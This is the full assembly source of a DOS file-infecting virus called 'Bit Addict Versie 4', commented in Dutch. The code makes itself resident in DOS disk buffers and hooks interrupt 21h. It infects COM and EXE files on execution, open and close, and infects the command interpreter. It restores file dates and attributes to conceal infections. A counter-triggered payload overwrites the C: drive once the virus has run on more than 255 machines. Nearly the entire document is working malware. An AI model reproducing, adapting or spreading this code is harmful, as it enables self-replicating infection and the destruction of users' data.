; Bit Addict Versie 4

;-----------------------------------------------------------------------------
;-----                                                                   -----
;-----              Macros en andere hulpmiddellen                       -----
;-----                                                                   -----
;-----------------------------------------------------------------------------

; de macro's hieronder worden gebruikt wanneer een conditionele sprong groter
; wordt dan 128 bytes en er dus een foutmelding komt

dfn	macro	Num1,Num2
	db	Num1
	dw	offset Num2
	endm

jmpc	macro	Dest			; vervanging voor jc
	local	@@00

	jnc	@@00
	jmp	Dest
@@00:
	endm

jmpnc	macro	Dest			; vervanging voor jnc
	local	@@00

	jc	@@00
	jmp	Dest
@@00:
	endm

jmpe	macro	Dest			; vervanging voor je
	local	@@00

	jnz	@@00
	jmp	Dest
@@00:
	endm

jmpne	macro	Dest			; vervanging voor jne
	local	@@00

	jz	@@00
	jmp	Dest
@@00:
	endm

eseg segment
	mov	ax,4c00h		; exit
	int	21h
eseg ends

;-----------------------------------------------------------------------------
;-----                                                                   -----
;-----              Begin van het Bit Addict virus                       -----
;-----                                                                   -----
;-----------------------------------------------------------------------------

cseg segment
	assume	cs:cseg,ds:cseg,es:cseg
	org	0

BeginCode	equ	$				; begin van het virus

CodeSize	equ	CodeEnd-BeginCode		; de grootte van het
CodeSizePara	equ	(CodeEnd-BeginCode+0fh) / 10h	; virus achter een file

VirusSize	equ	VirusEnd-BeginCode		; de grootte van het
VirusSizePara	equ	(VirusEnd-BeginCode+0fh) / 10h	; virus in het geheugen

HeaderLength	equ	18h				; grootte van een

SavedCode	equ	this byte			; gegevens over het
OldSignature	dw	5a4dh				; programma voor het
OldCSIP		equ	this dword			; virus
OldIP		dw	0
OldCS		dw	0
OldSP		dw	200h
OldSS		dw	0
OldPartPage	dw	0
OldPageCount	dw	0

Begin:	push	ax				; Programma om het virus
	push	ds				; resident te laten blijven
	push	es				; en om de comspec te
	call	Init				; infecteren
	jnc	@@12
	call	BiosCheck			; Als bit addict op een andere
	push	cs				; computer draait wordt er een
	pop	es				; teller verhoogt.
	xor	al,al
	mov	cx,VirusSize-CodeSize		; zet alle variabelen op nul
	mov	di,CodeSize
	cld
	rep	stosb				; debug interrupt 21h om het
	call	DebugOn				; orginele interrupt te vinden
	mov	ah,52h
	call	DOS				; lees het adres van de eerste
	push	bx				; disk-buffer
	mov	ah,30h
	call	DOS
	pop	di
	call	DebugOff
	cmp	al,2				; dit werkt niet op dos 1.x
	jb	@@12
	cmp	al,3				; voor dos 2.x op di+13h en
	adc	di,12h				; voor dos 3+  op di+12h
	lds	si,es:[di]
	or	si,si
	jne	@@12
	push	di
	cld
	movsw					; reserveer 1e buffer
	movsw
	pop	di
	mov	cx,ds
	mov	dx,ds
	mov	bx,3
@@10:	call	GetBuffer			; reserveer 2e,3e en 4e
	jc	@@11				; buffer 
	dec	bx
	jne	@@10
	call	CopyBitAddict			; Copieer bit addict naar
	pop	es				; de buffers
	push	es				; Infecteer bestand in de
	call	InfectComspec			; comspec
	jmp	short @@12
@@11:	call	RestoreBuffers			; voor als het fout gaat
@@12:	pop	es
	pop	ds				; ga nu verder met het
	pop	ax				; programma voor Bit Addict
	cli
	mov	ss,cs:OldSS
	mov	sp,cs:OldSP
	sti
	jmp	cs:OldCSIP


Comspec		db	'COMSPEC='	; comspec environment variabele
					; om de command.com te vinden

ID		dw	0DEADh		; hier wordt het virus herkend
					; als het in het geheugen staat

Count		dw	0		; In deze variabele staat op
					; hoeveel verschillende
					; computers het virus is
					; geweest
Bios		db	10h dup(0)	; Gegevens over de bios,
					; door dit te vergelijken met
					; de bios kan het virus weten
					; of het virus op een andere
					; computer draait

GetBuffer:				; reserveer een buffer
	push	di			; cx = eerste buffer
	push	es			; dx = laatste buffer
	jmp	short @@21
@@20:	push	ds			; zoek een buffer die naast een
	pop	es			; gereserveerde buffer ligt, dus
	mov	di,si			; 21h voor cx, of 21h na dx.
@@21:	lds	si,es:[di]
	or	si,si
	jne	@@23
	mov	ax,ds
	sub	ax,dx
	cmp	ax,21h
	jne	@@22
	mov	dx,ds
	cld
	movsw
	movsw
	clc
	jmp	short @@24
@@22:	mov	ax,ds
	sub	ax,cx
	cmp	ax,-21h
	jne	@@20
	mov	cx,ds
	cld
	movsw
	movsw
	clc
	jmp	short @@24
@@23:	stc
@@24:	pop	es
	pop	di
	ret

CopyBitAddict:
	push	cs				; copieer Bit Addict naar de
	pop	ds				; gereserveerde buffers
	mov	es,cx
	xor	si,si
	xor	di,di
	mov	cx,VirusSize
	cld
	rep	movsb
	xor	ax,ax				; leid interrupt 21h om naar
	mov	ds,ax				; Bit Addict
	mov	word ptr ds:[84h],offset NewInt21
	mov	word ptr ds:[86h],es
	ret

InfectComspec:
	mov	es,es:[2ch]			; lees environment segment
	xor	di,di
	push	cs				; zoek naar de comspec
	pop	ds				; variabele
	mov	si,offset Comspec
@@30:	push	si
	push	di
	mov	cx,8
	cld
	repe	cmpsb
	pop	di
	pop	si
	je	@@31
	xor	al,al
	mov	cx,-1
	cld
	repne	scasb
	cmp	byte ptr es:[di],0		; is dit de laatste variabele ?
	jne	@@30
	jmp	short @@33
@@31:	push	es				; infecteer de COMMAND.COM of
	pop	ds				; andere command interpreter,
	cmp	byte ptr ds:[di+9],':'		; maar doe dit alleen wanneer
	jne	@@32				; de comspec naar de c of de
	mov	al,ds:[di+8]			; d-drive wijst.
	and	al,0dfh
	cmp	al,'C'
	je	@@32
	cmp	al,'D'
	jne	@@33
@@32:	lea	dx,[di+8]
	push	cs:OldIP			; bewaar alle variabelen die
	push	cs:OldCS			; we nog nodig hebben.
	push	cs:OldSP
	push	cs:OldSS
	call	Infect				; infecteren
	pop	cs:OldSS			; herstel alle variabelen die
	pop	cs:OldSP			; we nog nodig hebben
	pop	cs:OldCS
	pop	cs:OldIP
@@33:	ret

RestoreBuffers:					; wanneer er niet genoeg
	mov	ax,cx				; buffers zijn, zet dan de
@@40:	cmp	ax,dx				; buffers weer terug in de
	je	@@42				; keten, anders zal het
	mov	ds,ax				; systeem hangen.
	add	ax,21h
	mov	word ptr ds:[0],0
	mov	word ptr ds:[2],ax
	jmp	short @@40
@@42:	mov	ds,dx
	mov	ax,es:[di]
	mov	ds:[0],ax
	mov	word ptr es:[di],0
	mov	ax,es:[di+2]
	mov	ds:[2],ax
	mov	es:[di+2],cx
	ret

DebugOn:push	ax				; deze procedere is om de
	push	ds				; trap-flag te zetten, en
	xor	ax,ax				; interrupt 1 te initialiseren
	mov	ds,ax
	cli
	mov	ax,ds:[4h]
	mov	word ptr cs:OldInt1[0],ax
	mov	ax,ds:[6h]
	mov	word ptr cs:OldInt1[2],ax
	mov	word ptr ds:[4],offset NewInt1
	mov	word ptr ds:[6],cs
	mov	ax,ds:[84h]
	mov	word ptr cs:OldInt21[0],ax
	mov	ax,ds:[86h]
	mov	word ptr cs:OldInt21[2],ax
	mov	word ptr cs:DosInt21[0],0
	mov	word ptr cs:DosInt21[2],0
	pushf
	pop	ax
	or	ah,1
	push	ax
	popf
	sti
	pop	ds
	pop	ax
	ret

DebugOff:					; deze procedure zet de
	push	ax				; trap-flag weer op nul en
	push	ds				; herstelt interrupt 1.
	cli
	pushf
	pop	ax
	and	ah,0feh
	push	ax
	popf
	xor	ax,ax
	mov	ds,ax
	mov	ax,word ptr cs:OldInt1[0]
	mov	ds:[4],ax
	mov	ax,word ptr cs:OldInt1[2]
	mov	ds:[6],ax
	sti
	pop	ds
	pop	ax
	ret

Init:	push	cs
	pop	ds
	cmp	OldSignature,5a4dh
	je	@@50
	mov	si,offset SavedCode		; herstel begin van het
	mov	di,100h				; com-programma
	mov	cx,Dead-ComHeader+2
	cld
	rep	movsb
	mov	OldSS,ss			; bewaar de waarden van
	mov	OldSP,sp			; ss,sp,cs en ip
	sub	OldSP,10h
	mov	OldCS,es
	mov	OldIP,100h
	jmp	short @@51
@@50:	mov	ax,es				; bereken de waarden van
	add	ax,10h				; ss,sp,cs en ip
	add	OldCS,ax
	add	OldSS,ax
@@51:	mov	ax,4b40h			; controleer of Bit Addict al
	int	21h				; in het geheugen aanwezig is
	jc	@@52
	mov	ds,ax
	mov	ax,word ptr ds:ID		; vergelijk identificatie
	cmp	ax,word ptr cs:ID
	je	@@52
	stc
@@52:	ret

BiosCheck:					; deze procedure vergelijkt
	mov	ax,0ffffh			; de bios, met de gegevens
	mov	ds,ax				; over de bios in het virus,
	push	cs				; zijn deze niet gelijk, dan
	pop	es				; zal het virus op een andere
	xor	si,si				; computer draaien, en wordt
	mov	di,offset Bios			; er een teller verhoogt, komt
	mov	cx,10h				; deze teller boven de 255 dan
	cld					; zal het bit-addict virus
	repe	cmpsb				; actief worden.
	je	@@54
	mov	ax,cs:Count
	inc	ax
	cmp	ax,100h
	jb	@@53
	call	BitAddict
@@53:	mov	cs:Count,ax
	xor	si,si
	mov	di,offset Bios
	mov	cx,10h
	rep	movsb
@@54:	ret

BitAddict:					; in deze procedure wordt
	xor	dx,dx				; de c-drive overscreven met
@@55:	push	dx				; onzin, dit mag verandert
	mov	ax,3				; worden, om het virus iets
	xor	bx,bx				; anders te laten doen, een
	mov	cx,40h				; muziekje spelen, of met het
	int	26h				; toetsenbord spelen
	pop	ax				; bijvoorbeeld.
	pop	dx
	add	dx,40h
	or	dx,dx
	jne	@@55
	ret

NewInt1:push	bp				; deze procedure wordt
	mov	bp,sp				; gebruikt bij het debuggen
	push	ax
	mov	ax,word ptr cs:DosInt21[0]
	or	ax,word ptr cs:DosInt21[2]
	jnz	@@60
	cmp	word ptr ss:[bp+4],300h
	jae	@@61
	mov	ax,ss:[bp+2]
	mov	word ptr cs:DosInt21[0],ax
	mov	ax,ss:[bp+4]
	mov	word ptr cs:DosInt21[2],ax
@@60:	and	word ptr ss:[bp+6],0feffh
@@61:	pop	ax
	pop	bp
	iret

DOS:	push	ax				; roept interrupt 21h aan.
	mov	ax,word ptr cs:DosInt21[0]
	or	ax,word ptr cs:DosInt21[2]
	pop	ax
	jnz	@@62
	pushf
	call	cs:OldInt21
	ret
@@62:	pushf
	call	cs:DosInt21
	ret

Functions:					; dit is een tabel met alle
	dfn	3ch,Open			; dos-functies die door
	dfn	3dh,Open			; bit-addict verandert worden
	dfn	3eh,Close
	dfn	3fh,Read
	dfn	40h,Write
	dfn	4bh,Exec

NewInt21:					; Het nieuwe interrupt 21h
	pushf
	push	bx
	push	bp
	mov	bp,sp
	mov	bx,offset Functions
@@63:	cmp	ah,cs:[bx]
	je	@@68
	add	bx,3
	cmp	bx,offset NewInt21
	jne	@@63
	pop	bp
	pop	bx
EOI:	popf
	jmp	cs:OldInt21
@@68:	mov	bx,cs:[bx+1]
	xchg	bx,ss:[bp+2]
	pop	bp
	ret

InstallCheck:					; Zo kan bit addict weten
	mov	ax,cs				; dat er al een andere copy
	popf					; aanwezig is
	clc
	retf	2

Exec:	cmp	al,40h
	je	InstallCheck
	call	CheckExtension			; functie 4bh, infecteer eerst
	jc	EOI				; met Bit Addict
	popf
	push	dx
	push	ds
	pushf
	call	cs:OldInt21
	pop	ds
	pop	dx
	pushf
	call	Infect
	popf
	retf	2

Open:	call	CheckExtension			; fn 3ch en 3dh
	jc	EOI
	call	cs:OldInt21
	jc	@@92
	pushf
	push	ax
	push	cx
	push	si
	push	di
	push	es
	push	cs
	pop	es
	mov	si,dx
	mov	di,offset File1
	cmp	word ptr es:[di],0
	je	@@90
	mov	di,offset File2
	cmp	word ptr es:[di],0
	jne	@@91
@@90:	cld
	stosw
	mov	cx,70
	rep	movsb
@@91:	pop	es
	pop	di
	pop	si
	pop	cx
	pop	ax
	popf
@@92:	retf	2

Close:	cmp	bx,cs:File1			; fn 3eh
	je	@@93
	cmp	bx,cs:File2
	jne	EOI
	call	cs:OldInt21
	push	si
	mov	si,offset File2
	jmp	short @@94
@@93:	call	cs:OldInt21
	push	si
	mov	si,offset File1
@@94:	jc	@@95
	pushf
	push	dx
	push	ds
	push	cs
	pop	ds
	lea	dx,[si+2]
	call	Infect
	pop	ds
	pop	dx
	popf
@@95:	mov	word ptr cs:[si],0
	pop	si
	retf	2

Read:	jmp	EOI				; fn 3fh

Write:	jmp	EOI				; fn 40h

CheckExtension:					; controleer of de extensie
	push	ax				; wel exe of com is
	push	cx
	push	si
	push	di
	push	es
	push	ds
	pop	es
	mov	di,dx				; zoek het einde van de
	xor	al,al				; file-naam
	mov	cx,70
	cld
	repne	scasb
	jne	@@65
	std
	mov	al,'.'				; zoek de laatste punt
	neg	cx
	add	cx,70
	std
	repne	scasb
	jne	@@65
	lea	si,[di+2]
	cld
	lodsw					; eerste 2 letters
	and	ax,0dfdfh			; maak hoofdletters
	cmp	ax,5845h			; 'EX'
	je	@@64
	cmp	ax,4f43h			; 'CO'
	jne	@@65
	lodsb					; 3e letter
	and	al,0dfh
	cmp	al,4dh				; 'M'
	je	@@66
	jmp	short @@65
@@64:	lodsb					; 3e letter
	and	al,0dfh
	cmp	al,45h				; 'E'
	je	@@66
@@65:	stc
	jmp	short @@67
@@66:	clc
@@67:	pop	es
	pop	di
	pop	si
	pop	cx
	pop	ax
	ret

ComHeader:					; dit stukje wordt voor een
	mov	ax,cs				; COM-file geplaatst, en is om
	add	ax,0100h			; het virus te starten.
OldSize	equ	this word-2
	push	ax
	mov	ax,offset Begin
	push	ax
	retf
Dead	equ	$
	dw	0DEADh				; signature, om te controleren
						; of een file al eens eerder
						; besmet is.

Infect:	push	ax				; Infecteer een file
	push	bx
	push	cx
	push	si
	push	di
	push	bp
	push	es
	mov	ax,4300h			; lees attributen en bewaar
	call	DOS				; ze
	jmpc	@@83
	push	cx
	push	dx
	push	ds
	test	cx,1
	jz	@@71
	mov	ax,4301h			; set Read-Only attribuut
	and	cx,0fffeh			; op nul
	call	DOS
	jmpc	@@82
@@71:	mov	ax,3d02h			; open de file
	call	DOS
	jmpc	@@82
	mov	bx,ax
	mov	ax,5700h			; lees de datum en tijd en
	call	DOS				; bewaar ze
	jmpc	@@81
	push	cx
	push	dx
	push	cs				; ds=es=cs
	pop	ds
	push	cs
	pop	es
	mov	ah,3fh				; lees de header van de file
	mov	cx,HeaderLength
	mov	dx,offset Header
	call	DOS
	jmpc	@@80
	cmp	ax,HeaderLength
	jne	@@75
	cmp	Signature,5a4dh			; Controleer of ID aanwezig is
	jne	@@72
	cmp	ExeID,0DEADh
	jmp	@@73
@@72:	cmp	ComID,0DEADh
@@73:	jmpe	@@80				; als ID aanwezig is, stop dan
@@74:	cmp	Signature,5a4dh
	je	@@77
@@75:	mov	ax,4202h			; infecteer com-files
	xor	cx,cx				; ga naar het einde van de file
	xor	dx,dx
	call	DOS
	mov	cx,10h				; aanpassen van de com-header
	div	cx				; aan deze com-file
	or	dx,dx
	je	@@76
	push	ax
	mov	ah,40h
	mov	cx,10h
	sub	cx,dx
	xor	dx,dx
	call	DOS
	pop	ax
	jmpc	@@80
	inc	ax
@@76:	add	ax,10h
	mov	OldSize,ax
	mov	si,offset Header		; bewaar het eerste deel van
	mov	di,offset SavedCode		; het programma
	mov	cx,Dead-ComHeader+2
	cld
	rep	movsb
	mov	ah,40h				; schrijf het virus achter het
	mov	cx,CodeSize			; programma
	xor	dx,dx
	call	DOS
	jmpc	@@80
	mov	ax,4200h			; ga naar het begin van de file
	xor	cx,cx
	xor	dx,dx
	call	DOS
	jmpc	@@80
	mov	ah,40h				; overschrijf het begin van het
	mov	cx,Dead-ComHeader+2		; programma met de com-header
	mov	dx,offset ComHeader
	call	DOS
	jmp	@@80
@@77:	mov	di,offset SavedCode		; infecteer exe-files
	mov	ax,5a4dh			; bewaar de oude waarden van
	stosw					; cs:ip en ss:sp
	mov	ax,ExeIP
	stosw
	mov	ax,ExeCS
	stosw
	mov	ax,ExeSP
	stosw
	mov	ax,ExeSS
	stosw
	mov	ax,PartPage
	stosw
	mov	ax,PageCount
	stosw
	mov	ExeID,0DEADh			; Zet ID in exe-header
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	int	21h
	mov	cx,10h
	div	cx
	or	dx,dx
	je	@@78
	push	ax
	push	dx
	mov	ah,40h
	mov	cx,10h
	sub	cx,dx
	xor	dx,dx
	call	DOS
	pop	dx
	pop	ax
	jc	@@80
	inc	ax
@@78:	sub	ax,HeaderSize
	mov	ExeCS,ax			
	mov	ExeIP,offset Begin
	add	ax,VirusSizePara
	mov	ExeSS,ax
	mov	ExeSP,200h
	mov	ax,MinMem
	cmp	ax,20h+VirusSizePara-CodeSizePara
	jae	@@79
	mov	ax,20h
@@79:	mov	MinMem,ax
	mov	ah,40h				; schrijf het virus achter
	mov	cx,CodeSize			; de exe-file
	xor	dx,dx
	call	DOS
	jc	@@80
	mov	ax,4202h			; Pas de file-lengte in de
	xor	cx,cx				; header aan, als de file veel
	xor	dx,dx				; overlays bevat, dan zal de
	call	DOS				; exe-file niet meer werken,
	mov	cx,200h				; maar de file kan wel hersteld
	div	cx				; worden.
	cmp	dx,1
	cmc
	adc	ax,0
	mov	PageCount,ax
	mov	PartPage,dx
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx				; ga naar het begin van de file
	call	DOS
	jc	@@80
	mov	ah,40h				; schrijf de nieuwe exe-header
	mov	cx,HeaderLength			; over de oude heen.
	mov	dx,offset Header
	call	DOS
@@80:	pop	dx				; herstel de datum van de file
	pop	cx
	mov	ax,5701h
	call	DOS
@@81:	mov	ah,3eh				; sluit de file
	call	DOS
@@82:	pop	ds				; herstel de attributen van de
	pop	dx				; file
	pop	cx
	test	cx,1
	jz	@@83
	mov	ax,4301h
	call	DOS
@@83:	pop	es				; herstel de waarden van de
	pop	bp				; registers en keer terug
	pop	di				; naar het oude interrupt 21
	pop	si
	pop	cx
	pop	bx
	pop	ax
	ret

CodeEnd		equ	$

Header		dw	HeaderLength/2 dup(0)
ComCS		equ	Header[OldSize-Comheader]	; Com file
ComID		equ	Header[Dead-ComHeader]

Signature	equ	Header[0h]			; Exe file
PartPage	equ	Header[2h]
PageCount	equ	Header[4h]
HeaderSize	equ	Header[8h]
MinMem		equ	Header[0ah]
MaxMem		equ	Header[0ch]
ExeSS		equ	Header[0eh]
ExeSP		equ	Header[10h]
ExeID		equ	Header[12h]
ExeIP		equ	Header[14h]
ExeCS		equ	Header[16h]

DosInt21	dd	0
OldInt21	dd	0
OldInt1		dd	0

File1		dw	36 dup(0)
File2		dw	36 dup(0)

VirusEnd	equ	$

cseg ends

sseg segment stack
	db	200h dup(1)
sseg ends

end Begin